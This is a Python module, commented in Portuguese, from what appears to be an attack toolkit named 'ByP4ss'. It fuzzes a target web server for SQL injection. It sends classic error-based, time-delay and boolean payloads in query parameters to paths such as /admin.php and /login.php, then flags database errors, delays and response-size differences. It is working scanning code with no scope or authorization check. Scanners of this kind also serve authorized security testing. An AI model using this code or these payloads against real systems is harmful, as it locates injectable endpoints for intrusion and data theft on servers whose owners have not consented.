# FuzzSqli do ByP4ss
# Testa payloads SQLi em query string, detecta erro/sleep/diferenca booleana.
# Chamado por FuzzEngine: Mod.Testar(Alvo, Iteracoes) -> dict
#
# Categorias:
#   error-based: "'", "' OR '1'='1", "UNION SELECT" -> erro no corpo
#   time-based: SLEEP(5), pg_sleep(5), WAITFOR DELAY -> latencia > 2s
#   boolean: "AND 1=1" vs "AND 1=2" -> tamanho do corpo muda
#
# Nao executa comando. So HTTP GET.

import time
import socket
import urllib.parse

from Core.Config import Config
from Core.Log import Log


class FuzzSqli:

    PATHS = ["/", "/index.php", "/admin.php", "/api", "/login.php", "/search.php"]
    PARAMS = ["id", "page", "cat", "user", "q", "query"]

    PAYLOADS_ERROR = [
        "'", "''", "';", "'; --", "' OR '1'='1", "' OR 1=1 --",
        "' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --",
        "') OR ('1'='1", "\" OR \"\"=\"", "` OR 1=1 --",
    ]
    PAYLOADS_TIME = [
        "' AND SLEEP(5) --", "'; SELECT pg_sleep(5) --",
        "'; WAITFOR DELAY '0:0:5' --", "' OR SLEEP(5) --",
    ]
    PAYLOAD_BOOL_TRUE = "' AND 1=1 --"
    PAYLOAD_BOOL_FALSE = "' AND 1=2 --"

    PALAVRAS_ERRO = [
        "sql syntax", "mysql_fetch", "ora-", "postgresql",
        "sqlite", "microsoft ole db", "unclosed quotation",
        "syntax error", "warning: mysql", "division by zero",
        "you have an error in your sql",
    ]
    TIMEOUT = 2.0
    LIMIAR_SLEEP = 2.0
    LIMIAR_BOOL = 200

    @staticmethod
    def Testar(Alvo, Iteracoes):
        Resultado = {
            "ok": True, "tecnica": "sqli",
            "iteracoes": int(Iteracoes or 100),
            "crashes": [], "anomalias": [],
            "duracao_s": 0.0,
        }
        if not Alvo:
            Resultado["ok"] = False
            Resultado["motivo"] = "alvo_ausente"
            return Resultado
        Inicio = time.monotonic()
        Porta = 80
        Count = 0
        # error-based
        for Payload in FuzzSqli.PAYLOADS_ERROR:
            for Path in FuzzSqli.PATHS:
                if Count >= Resultado["iteracoes"]:
                    break
                Param = FuzzSqli.PARAMS[Count % len(FuzzSqli.PARAMS)]
                R = FuzzSqli._TestarPayload(Alvo, Porta, Path, Param, Payload)
                Count += 1
                FuzzSqli._RegistrarErro(R, Payload, Path, Param, Resultado)
            if Count >= Resultado["iteracoes"]:
                break
        # time-based
        for Payload in FuzzSqli.PAYLOADS_TIME:
            if Count >= Resultado["iteracoes"]:
                break
            Path = FuzzSqli.PATHS[0]
            Param = FuzzSqli.PARAMS[0]
            R = FuzzSqli._TestarPayload(Alvo, Porta, Path, Param, Payload)
            Count += 1
            FuzzSqli._RegistrarSleep(R, Payload, Path, Param, Resultado)
        # boolean-based
        if Count < Resultado["iteracoes"]:
            for Path in FuzzSqli.PATHS[:2]:
                if Count >= Resultado["iteracoes"]:
                    break
                Param = FuzzSqli.PARAMS[0]
                R1 = FuzzSqli._TestarPayload(Alvo, Porta, Path, Param,
                                              FuzzSqli.PAYLOAD_BOOL_TRUE)
                R2 = FuzzSqli._TestarPayload(Alvo, Porta, Path, Param,
                                              FuzzSqli.PAYLOAD_BOOL_FALSE)
                Count += 2
                FuzzSqli._RegistrarBool(R1, R2, Path, Param, Resultado)
        Resultado["iteracoes"] = Count
        Resultado["duracao_s"] = round(time.monotonic() - Inicio, 2)
        return Resultado

    @staticmethod
    def _TestarPayload(Alvo, Porta, Path, Param, Payload):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.settimeout(FuzzSqli.TIMEOUT)
        Inicio = time.monotonic()
        try:
            if Sock.connect_ex((Alvo, Porta)) != 0:
                return {"ok": False, "motivo": "conexao_falhou"}
            ValorEnc = urllib.parse.quote(Payload, safe="")
            Sep = "&" if "?" in Path else "?"
            AlvoUrl = f"{Path}{Sep}{Param}={ValorEnc}"
            Req = (f"GET {AlvoUrl} HTTP/1.0\r\n"
                   f"Host: {Alvo}\r\nConnection: close\r\n\r\n")
            Sock.sendall(Req.encode("utf-8", errors="replace"))
            Dados = Sock.recv(8192)
            Lat = round(time.monotonic() - Inicio, 2)
            return {
                "ok": True,
                "status": FuzzSqli._Status(Dados),
                "tamanho": len(Dados),
                "latencia": Lat,
                "corpo": Dados[:4096].decode("utf-8", errors="replace"),
            }
        except socket.timeout:
            return {"ok": False, "motivo": "timeout",
                    "latencia": round(time.monotonic() - Inicio, 2)}
        except Exception as E:
            return {"ok": False, "motivo": type(E).__name__}
        finally:
            try: Sock.close()
            except Exception: pass

    @staticmethod
    def _Status(Dados):
        if not Dados:
            return 0
        try:
            P = Dados.split(b"\r\n", 1)[0].decode("utf-8", errors="replace").split()
            if len(P) >= 2:
                return int(P[1])
        except Exception:
            pass
        return 0

    @staticmethod
    def _RegistrarErro(R, Payload, Path, Param, Resultado):
        if not R.get("ok"):
            return
        Corpo = (R.get("corpo") or "").lower()
        Achou = any(P in Corpo for P in FuzzSqli.PALAVRAS_ERRO)
        if Achou or R.get("status", 0) >= 500:
            Resultado["crashes"].append({
                "tipo": "sqli_error", "path": Path, "param": Param,
                "payload": Payload[:40], "status": R.get("status"),
                "evidencia": Corpo[:200] if Achou else "",
            })

    @staticmethod
    def _RegistrarSleep(R, Payload, Path, Param, Resultado):
        if R.get("motivo") == "timeout":
            Resultado["anomalias"].append({
                "tipo": "sqli_sleep_timeout", "path": Path, "param": Param,
                "payload": Payload[:40], "latencia": R.get("latencia", 0),
            })
            return
        if not R.get("ok"):
            return
        Lat = R.get("latencia", 0)
        if Lat >= FuzzSqli.LIMIAR_SLEEP:
            Resultado["crashes"].append({
                "tipo": "sqli_sleep", "path": Path, "param": Param,
                "payload": Payload[:40], "latencia": Lat,
            })

    @staticmethod
    def _RegistrarBool(R1, R2, Path, Param, Resultado):
        if not R1.get("ok") or not R2.get("ok"):
            return
        T1 = R1.get("tamanho", 0)
        T2 = R2.get("tamanho", 0)
        Diferenca = abs(T1 - T2)
        if Diferenca >= FuzzSqli.LIMIAR_BOOL:
            Resultado["crashes"].append({
                "tipo": "sqli_boolean", "path": Path, "param": Param,
                "tamanho_true": T1, "tamanho_false": T2,
                "diferenca": Diferenca,
            })

    @staticmethod
    def Info():
        return {
            "nome": "FuzzSqli",
            "error_payloads": len(FuzzSqli.PAYLOADS_ERROR),
            "time_payloads": len(FuzzSqli.PAYLOADS_TIME),
            "paths": len(FuzzSqli.PATHS),
            "params": len(FuzzSqli.PARAMS),
        }
